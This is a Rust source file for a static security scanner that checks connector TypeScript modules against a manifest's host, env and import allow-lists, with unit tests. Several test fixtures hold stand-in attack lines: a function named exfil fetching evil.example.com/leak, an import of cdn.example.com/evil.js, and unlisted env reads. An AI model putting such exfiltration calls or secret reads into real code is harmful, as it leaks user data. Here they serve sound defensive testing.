// ─────────────────────────────────────────────
//  Connector Static Scanner - Phase 5 of CONNECTORS.md
//
//  Real TypeScript AST walk via tree-sitter (§11 forbids regex). The
//  scanner is the security gate that stops Bob from silently widening
//  trust: if module.ts reaches a host or env key not in the manifest
//  allow-list, activation fails here.
//
//  What we collect from module.ts:
//    - Hosts inside fetch("https://…") string literals
//    - Keys passed to Deno.env.get("KEY")
//    - Import specifiers, including dynamic imports
//    - Dangerous patterns: globalThis['fetch'], eval, Function ctor
//
//  Comparison to the manifest:
//    - Every host found must be in host_allowlist
//    - Every env key found must be in env_allowlist
//    - Imports must be from a fixed allow-list (Deno std + a small set
//      of vetted libraries). Dynamic imports always fail unless the
//      specifier is a static string literal.
//    - Any "danger pattern" fails outright.
// ─────────────────────────────────────────────

use std::collections::BTreeSet;
use std::path::Path;

use serde::Serialize;
use tree_sitter::{Node, Parser};

use crate::connector_manifest::ConnectorManifest;

#[derive(Debug, Clone, Serialize, Default)]
pub struct ScanReport {
    pub hosts_found: Vec<String>,
    pub env_reads_found: Vec<String>,
    pub imports_found: Vec<String>,
    /// True if the AST walk hit a pattern we refuse to reason about
    /// statically - dynamic imports with non-literal arg, eval, Function
    /// constructor, globalThis['fetch'].
    pub dynamic_access: Vec<String>,
    pub violations: Vec<String>,
}

impl ScanReport {
    pub fn passed(&self) -> bool { self.violations.is_empty() }
}

/// Hosts/specifiers the module is allowed to import without being in
/// the manifest. The Deno standard library and our own SDK shim live
/// here. Everything else must be declared in the manifest.
const ALWAYS_ALLOWED_IMPORTS: &[&str] = &[
    // Deno standard library
    "jsr:@std/",
    "https://deno.land/std",
    // Orbix's own SDK shim (lands in Phase 5 follow-up)
    "orbix:sdk",
];

const DANGER_PATTERNS: &[(&str, &str)] = &[
    ("eval", "eval() defeats static analysis; refuse to ship"),
    ("Function", "new Function(...) constructor defeats static analysis"),
];

// ─────────────────────────────────────────────
//  Public entry
// ─────────────────────────────────────────────

pub fn scan_module(module_ts_path: &Path, manifest: &ConnectorManifest) -> Result<ScanReport, String> {
    let source = std::fs::read_to_string(module_ts_path)
        .map_err(|e| format!("read {}: {}", module_ts_path.display(), e))?;
    scan_source(&source, manifest)
}

pub fn scan_source(source: &str, manifest: &ConnectorManifest) -> Result<ScanReport, String> {
    let mut parser = Parser::new();
    parser
        .set_language(&tree_sitter_typescript::language_typescript())
        .map_err(|e| format!("set ts language: {}", e))?;
    let tree = parser
        .parse(source, None)
        .ok_or_else(|| "tree-sitter parse returned None".to_string())?;
    let root = tree.root_node();

    let mut report = ScanReport::default();
    let bytes = source.as_bytes();

    // First pass: discover which SDK helper names are bound to the
    // trusted ./orbix-sdk.ts module. `env`, `vaultPut`, etc. only count
    // as SDK calls when imported from there - a user-defined function
    // also named `env` should not get the same trust.
    let sdk_bindings = collect_sdk_bindings(root, bytes);

    walk(root, bytes, &mut report, &sdk_bindings);
    compare_to_manifest(&mut report, manifest);

    Ok(report)
}

// ─────────────────────────────────────────────
//  SDK binding discovery
//
//  When a module does `import { env, OrbixError } from "./orbix-sdk.ts"`,
//  it has trusted helpers named `env` and `OrbixError`. The scanner
//  recognises calls to those names as SDK-mediated reads against the
//  manifest's env_allowlist, which is what makes the LinkedIn module's
//  `env("LINKEDIN_TOKEN")` count as an env read for activation.
// ─────────────────────────────────────────────

use std::collections::HashSet;

#[derive(Debug, Default)]
struct SdkBindings {
    /// Local names that were imported from ./orbix-sdk.ts. Tracks the
    /// `env` symbol primarily; future SDK helpers (vaultPut, etc.) land
    /// here too.
    names: HashSet<String>,
}

impl SdkBindings {
    fn binds(&self, name: &str) -> bool {
        self.names.contains(name)
    }
}

fn collect_sdk_bindings(root: Node<'_>, src: &[u8]) -> SdkBindings {
    let mut out = SdkBindings::default();
    walk_imports(root, src, &mut out);
    out
}

fn walk_imports(node: Node<'_>, src: &[u8], out: &mut SdkBindings) {
    if node.kind() == "import_statement" {
        // Locate the source string and the import_clause that lists
        // the bound names.
        let mut source: Option<String> = None;
        let mut clause: Option<Node<'_>> = None;
        for i in 0..node.child_count() {
            let Some(c) = node.child(i) else { continue };
            if c.kind() == "string" {
                source = string_literal_value(c, src);
            }
            if c.kind() == "import_clause" {
                clause = Some(c);
            }
        }
        if source.as_deref() == Some(crate::connector_sdk::SDK_IMPORT_SPEC) {
            if let Some(clause) = clause {
                collect_clause_names(clause, src, out);
            }
        }
    }
    for i in 0..node.child_count() {
        if let Some(c) = node.child(i) {
            walk_imports(c, src, out);
        }
    }
}

fn collect_clause_names(node: Node<'_>, src: &[u8], out: &mut SdkBindings) {
    // import_clause children we care about:
    //   - identifier              (default import)
    //   - named_imports           (named imports - recurse)
    //   - import_specifier        (a single binding inside named_imports)
    //   - namespace_import        (* as foo - capture foo)
    match node.kind() {
        "identifier" => {
            out.names.insert(node_text(node, src));
        }
        "import_specifier" => {
            // Either `name` or `name as alias`. The local-name field is
            // the rightmost identifier child.
            let mut last_ident: Option<Node<'_>> = None;
            for i in 0..node.child_count() {
                if let Some(c) = node.child(i) {
                    if c.kind() == "identifier" { last_ident = Some(c); }
                }
            }
            if let Some(id) = last_ident {
                out.names.insert(node_text(id, src));
            }
        }
        _ => {
            for i in 0..node.child_count() {
                if let Some(c) = node.child(i) {
                    collect_clause_names(c, src, out);
                }
            }
        }
    }
}

// ─────────────────────────────────────────────
//  AST walk
// ─────────────────────────────────────────────

fn walk(node: Node<'_>, src: &[u8], report: &mut ScanReport, sdk: &SdkBindings) {
    inspect_node(node, src, report, sdk);
    let mut cur = node.walk();
    for child in node.children(&mut cur) {
        walk(child, src, report, sdk);
    }
}

fn inspect_node(node: Node<'_>, src: &[u8], report: &mut ScanReport, sdk: &SdkBindings) {
    match node.kind() {
        // fetch("https://...") - call_expression whose function is `fetch`
        "call_expression" => inspect_call(node, src, report, sdk),
        // import "..."; import x from "..."; export ... from "..."
        "import_statement" | "export_statement" => inspect_import(node, src, report),
        _ => {}
    }
}

fn inspect_call(node: Node<'_>, src: &[u8], report: &mut ScanReport, sdk: &SdkBindings) {
    let Some(fn_node) = node.child_by_field_name("function") else { return };
    let fn_text = node_text(fn_node, src);

    // SDK-mediated env read: env("KEY") where `env` is imported from
    // ./orbix-sdk.ts. Equivalent to Deno.env.get("KEY") for the
    // env_allowlist comparison below.
    if sdk.binds(&fn_text) && fn_text == "env" {
        if let Some(arg) = first_argument(node) {
            if let Some(literal) = string_literal_value(arg, src) {
                report.env_reads_found.push(literal);
                return;
            }
            report.dynamic_access.push("SDK env() called with non-literal key".into());
            return;
        }
    }

    match fn_text.as_str() {
        "fetch" | "globalThis.fetch" | "window.fetch" => {
            if let Some(arg) = first_argument(node) {
                if let Some(literal) = string_literal_value(arg, src) {
                    if let Some(host) = extract_host(&literal) {
                        report.hosts_found.push(host);
                    } else {
                        report.dynamic_access.push(
                            format!("fetch with non-URL string '{}'", literal),
                        );
                    }
                } else {
                    report.dynamic_access.push(
                        "fetch() called with non-literal argument".into(),
                    );
                }
            }
        }
        "Deno.env.get" | "Deno.env.has" | "Deno.env.toObject" => {
            if let Some(arg) = first_argument(node) {
                if let Some(literal) = string_literal_value(arg, src) {
                    report.env_reads_found.push(literal);
                } else {
                    report.dynamic_access.push(
                        "Deno.env.get called with non-literal key".into(),
                    );
                }
            } else if fn_text == "Deno.env.toObject" {
                report.dynamic_access.push("Deno.env.toObject() enumerates all envs".into());
            }
        }
        // Dynamic import('...').
        "import" => {
            if let Some(arg) = first_argument(node) {
                if let Some(literal) = string_literal_value(arg, src) {
                    report.imports_found.push(literal);
                } else {
                    report.dynamic_access.push("dynamic import() with non-literal".into());
                }
            }
        }
        // Reject eval(...), new Function(...). Function ctor is reported
        // via the constructor's new_expression elsewhere; eval is here.
        "eval" => report.violations.push(DANGER_PATTERNS[0].1.into()),
        _ => {}
    }

    // Bracket access on globalThis['fetch'] / window['fetch'] - fall
    // through to detect via subscript on an "identifier" parent.
    if fn_text.contains("globalThis[") || fn_text.contains("window[") {
        report.dynamic_access.push(format!("indirect global access: {}", fn_text));
    }
}

fn inspect_import(node: Node<'_>, src: &[u8], report: &mut ScanReport) {
    // The import source is a `string` child. Walk children, find first
    // string, take its content.
    let mut cur = node.walk();
    for child in node.children(&mut cur) {
        if child.kind() == "string" {
            if let Some(value) = string_literal_value(child, src) {
                report.imports_found.push(value);
                return;
            }
        }
    }
}

// ─────────────────────────────────────────────
//  Helpers
// ─────────────────────────────────────────────

fn node_text(node: Node<'_>, src: &[u8]) -> String {
    let start = node.start_byte();
    let end = node.end_byte();
    String::from_utf8_lossy(&src[start..end]).into_owned()
}

fn first_argument<'a>(call: Node<'a>) -> Option<Node<'a>> {
    let args = call.child_by_field_name("arguments")?;
    for i in 0..args.child_count() {
        let c = args.child(i)?;
        if !matches!(c.kind(), "(" | ")" | ",") {
            return Some(c);
        }
    }
    None
}

/// Return the string content if this node is a string literal, else None.
fn string_literal_value(node: Node<'_>, src: &[u8]) -> Option<String> {
    if node.kind() != "string" { return None; }
    let mut cur = node.walk();
    for child in node.children(&mut cur) {
        if child.kind() == "string_fragment" {
            return Some(node_text(child, src));
        }
    }
    // Template literal with no substitutions is a `template_string`;
    // skip - we only treat plain strings as decidable.
    None
}

fn extract_host(url: &str) -> Option<String> {
    let lower = url.to_ascii_lowercase();
    if let Some(rest) = lower.strip_prefix("https://").or_else(|| lower.strip_prefix("http://")) {
        let host_part = rest.split('/').next()?;
        let host = host_part.split(':').next()?; // strip port
        if host.is_empty() { None } else { Some(host.to_string()) }
    } else {
        None
    }
}

fn import_allowed(spec: &str, manifest: &ConnectorManifest) -> bool {
    if ALWAYS_ALLOWED_IMPORTS.iter().any(|p| spec.starts_with(p)) {
        return true;
    }
    // Imports that hit the network at module load time must also pass
    // through the host_allowlist.
    if let Some(host) = extract_host(spec) {
        return manifest.host_allowlist.iter().any(|h| h == &host);
    }
    // Local relative imports (./util.ts) are fine.
    spec.starts_with("./") || spec.starts_with("../")
}

// ─────────────────────────────────────────────
//  Comparison to manifest - produces violations
// ─────────────────────────────────────────────

fn compare_to_manifest(report: &mut ScanReport, manifest: &ConnectorManifest) {
    // Dedupe to keep error messages tight.
    let hosts: BTreeSet<&String> = report.hosts_found.iter().collect();
    let envs: BTreeSet<&String> = report.env_reads_found.iter().collect();
    let imports: BTreeSet<&String> = report.imports_found.iter().collect();

    for h in hosts {
        if !manifest.host_allowlist.iter().any(|a| a == h) {
            report.violations.push(format!(
                "host '{}' is reached by module.ts but not in manifest.host_allowlist",
                h,
            ));
        }
    }
    for e in envs {
        if !manifest.env_allowlist.iter().any(|a| a == e) {
            report.violations.push(format!(
                "env '{}' is read by module.ts but not in manifest.env_allowlist",
                e,
            ));
        }
    }
    for imp in imports {
        if !import_allowed(imp, manifest) {
            report.violations.push(format!(
                "import '{}' is not in ALWAYS_ALLOWED_IMPORTS nor manifest.host_allowlist",
                imp,
            ));
        }
    }
    // Dynamic access kills the scan unconditionally - we can't reason
    // about a fetch whose URL is constructed at runtime, so we refuse to
    // ship it. Bob must rewrite the module with literal URLs.
    if !report.dynamic_access.is_empty() {
        let count = report.dynamic_access.len();
        report.violations.push(format!(
            "module uses {} pattern(s) that defeat static analysis; \
             rewrite with literal arguments",
            count,
        ));
    }
}

// ─────────────────────────────────────────────
//  Tests
// ─────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeMap;

    fn manifest_with(host_allowlist: &[&str], env_allowlist: &[&str]) -> ConnectorManifest {
        ConnectorManifest {
            slug: "test".into(),
            version: "0.1.0".into(),
            display_name: "Test".into(),
            vendor: "test".into(),
            driver: crate::connector_manifest::Driver::Api,
            auth: crate::connector_manifest::AuthSpec::None,
            host_allowlist: host_allowlist.iter().map(|s| s.to_string()).collect(),
            env_allowlist: env_allowlist.iter().map(|s| s.to_string()).collect(),
            vault_env_map: BTreeMap::new(),
            capabilities: Vec::new(),
            actions: BTreeMap::new(),
            events: BTreeMap::new(),
            resource_limits: Default::default(),
            signature: None,
        }
    }

    #[test]
    fn clean_module_with_declared_host_passes() {
        let src = r#"
            export async function send_message(inputs: any) {
              const r = await fetch("https://api.linkedin.com/v2/posts", {
                method: "POST",
                headers: { Authorization: "Bearer " + Deno.env.get("LINKEDIN_TOKEN") },
              });
              return await r.json();
            }
        "#;
        let m = manifest_with(&["api.linkedin.com"], &["LINKEDIN_TOKEN"]);
        let r = scan_source(src, &m).unwrap();
        assert!(r.passed(), "violations: {:?}", r.violations);
        assert!(r.hosts_found.contains(&"api.linkedin.com".to_string()));
        assert!(r.env_reads_found.contains(&"LINKEDIN_TOKEN".to_string()));
    }

    #[test]
    fn host_not_in_manifest_fails_activation() {
        // Acceptance criterion from CONNECTORS.md §10 Phase 5:
        // "Deliberately ask Bob to add a host not in the manifest;
        //  activation must fail at the static-scan step."
        let src = r#"
            export async function exfil() {
              await fetch("https://evil.example.com/leak");
            }
        "#;
        let m = manifest_with(&["api.linkedin.com"], &[]);
        let r = scan_source(src, &m).unwrap();
        assert!(!r.passed());
        assert!(r.violations.iter().any(|v| v.contains("evil.example.com")));
    }

    #[test]
    fn env_read_not_in_manifest_fails() {
        let src = r#"
            const x = Deno.env.get("HOME");
        "#;
        let m = manifest_with(&[], &["LINKEDIN_TOKEN"]);
        let r = scan_source(src, &m).unwrap();
        assert!(!r.passed());
        assert!(r.violations.iter().any(|v| v.contains("HOME")));
    }

    #[test]
    fn dynamic_fetch_url_blocks_activation() {
        let src = r#"
            const host = "https://" + something + ".com";
            await fetch(host);
        "#;
        let m = manifest_with(&[], &[]);
        let r = scan_source(src, &m).unwrap();
        assert!(!r.passed());
        assert!(r.violations.iter().any(|v| v.contains("static analysis")));
    }

    #[test]
    fn dynamic_env_key_blocks_activation() {
        let src = r#"
            const key = "LINKEDIN_TOKEN";
            const tok = Deno.env.get(key);
        "#;
        let m = manifest_with(&[], &["LINKEDIN_TOKEN"]);
        let r = scan_source(src, &m).unwrap();
        assert!(!r.passed());
    }

    #[test]
    fn deno_env_toobject_blocks_activation() {
        let src = r#"
            const all = Deno.env.toObject();
        "#;
        let m = manifest_with(&[], &[]);
        let r = scan_source(src, &m).unwrap();
        assert!(!r.passed());
    }

    #[test]
    fn allowed_import_from_std_passes() {
        let src = r#"
            import { join } from "jsr:@std/path";
            import sdk from "orbix:sdk";
        "#;
        let m = manifest_with(&[], &[]);
        let r = scan_source(src, &m).unwrap();
        assert!(r.passed(), "violations: {:?}", r.violations);
    }

    #[test]
    fn unlisted_remote_import_fails() {
        let src = r#"
            import evil from "https://cdn.example.com/evil.js";
        "#;
        let m = manifest_with(&[], &[]);
        let r = scan_source(src, &m).unwrap();
        assert!(!r.passed());
        assert!(r.violations.iter().any(|v| v.contains("cdn.example.com")));
    }

    #[test]
    fn dynamic_import_with_non_literal_blocks() {
        let src = r#"
            const mod = "./evil.ts";
            await import(mod);
        "#;
        let m = manifest_with(&[], &[]);
        let r = scan_source(src, &m).unwrap();
        assert!(!r.passed());
    }

    #[test]
    fn bundled_linkedin_reference_module_passes_its_own_manifest() {
        // The canonical reference module we ship under resources/ must
        // pass its own manifest's scan. If a refactor breaks that, this
        // test catches it - Bob's authoring loop will produce modules
        // shaped like this one.
        let crate_dir = env!("CARGO_MANIFEST_DIR");
        let manifest_path = std::path::PathBuf::from(crate_dir)
            .join("resources/modules/linkedin/v1/manifest.json");
        let module_path = std::path::PathBuf::from(crate_dir)
            .join("resources/modules/linkedin/v1/module.ts");
        let manifest_text = std::fs::read_to_string(&manifest_path)
            .expect("read linkedin manifest");
        let m: ConnectorManifest = serde_json::from_str(&manifest_text)
            .expect("parse linkedin manifest");
        let source = std::fs::read_to_string(&module_path)
            .expect("read linkedin module.ts");
        let r = scan_source(&source, &m).unwrap();
        assert!(
            r.passed(),
            "LinkedIn reference module violations: {:?}",
            r.violations,
        );
        // Sanity: the scan should have detected the literal hosts.
        assert!(r.hosts_found.iter().any(|h| h == "api.linkedin.com"));
        // SDK-mediated env reads are now first-class: env("LINKEDIN_TOKEN")
        // imported from ./orbix-sdk.ts counts the same as
        // Deno.env.get("LINKEDIN_TOKEN") for the env_allowlist check.
        assert!(r.env_reads_found.iter().any(|e| e == "LINKEDIN_TOKEN"));
        assert!(r.imports_found.iter().any(|i| i == "./orbix-sdk.ts"));
    }

    #[test]
    fn sdk_env_call_with_unlisted_key_fails() {
        // Hardening: the SDK's env() helper is now recognised by the
        // scanner, so a module that calls env("HOME") fails the same
        // way as a direct Deno.env.get("HOME") would.
        let src = r#"
            import { env } from "./orbix-sdk.ts";
            const home = env("HOME");
        "#;
        let m = manifest_with(&[], &["LINKEDIN_TOKEN"]);
        let r = scan_source(src, &m).unwrap();
        assert!(!r.passed());
        assert!(r.violations.iter().any(|v| v.contains("HOME")));
    }

    #[test]
    fn sdk_env_call_with_dynamic_key_blocks() {
        let src = r#"
            import { env } from "./orbix-sdk.ts";
            const k = "LINKEDIN_TOKEN";
            const t = env(k);
        "#;
        let m = manifest_with(&[], &["LINKEDIN_TOKEN"]);
        let r = scan_source(src, &m).unwrap();
        assert!(!r.passed());
    }

    #[test]
    fn env_called_without_sdk_import_does_not_count_as_env_read() {
        // A user-defined `env` function called env("FOO") must NOT be
        // treated as a Deno.env.get - it's just a function call.
        let src = r#"
            function env(name: string) { return "stub-" + name; }
            const v = env("ANYTHING");
        "#;
        let m = manifest_with(&[], &[]);
        let r = scan_source(src, &m).unwrap();
        assert!(r.passed(), "violations: {:?}", r.violations);
        assert!(r.env_reads_found.is_empty());
    }

    #[test]
    fn relative_local_imports_pass() {
        let src = r#"
            import { helper } from "./util.ts";
        "#;
        let m = manifest_with(&[], &[]);
        let r = scan_source(src, &m).unwrap();
        assert!(r.passed(), "violations: {:?}", r.violations);
    }
}
